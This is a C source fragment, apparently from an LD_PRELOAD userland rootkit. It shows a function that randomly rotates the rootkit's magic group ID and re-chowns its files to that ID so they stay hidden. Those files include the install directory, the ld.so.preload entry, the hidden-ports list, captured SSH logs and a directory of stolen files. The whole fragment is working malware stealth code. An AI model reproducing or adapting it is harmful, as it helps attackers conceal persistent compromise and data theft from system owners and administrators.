gid_t changerkgid(void){
    hook(CFOPEN, COPENDIR, CREADDIR, CSETGID,
         CFWRITE);
    srand(time(NULL));

    FILE *fp;
    gid_t newgid;
    int x = 3;
    char buf[12];

    // got new gid. write it.
    fp = call(CFOPEN, GID_PATH, "w");
    if(fp == NULL)
        return -1;

    newgid = rand() >> x;
    while((long)call(CSETGID, newgid) < 0)
        newgid = rand() >> x++;

    snprintf(buf, sizeof(buf), "%d", newgid);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fclose(fp);

    // now rehide erythin
    chown_path(GID_PATH, newgid);
    chown_path(INSTALL_DIR, newgid);
    chown_path(LDSO_PRELOAD, newgid);
#ifdef AUTO_GID_CHANGER
    chown_path(GIDTIME_PATH, newgid);
#endif
#ifdef HIDE_PORTS
    chown_path(HIDEPORTS, newgid);
#endif
#ifdef LOG_SSH
    chown_path(SSH_LOGS, newgid);
#endif
#ifdef FILE_STEAL
    chown_path(INTEREST_DIR, newgid);
#endif

    // all 'static' paths have been hidden. hide everything in installdir.
    DIR *dp = call(COPENDIR, INSTALL_DIR);
    if(dp == NULL)
        return -1;

    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char tmp[strlen(INSTALL_DIR) + strlen(dir->d_name) + 3];
        snprintf(tmp, sizeof(tmp), "%s/%s", INSTALL_DIR, dir->d_name);
        chown_path(tmp, newgid);
    }
    closedir(dp);

    return newgid;
}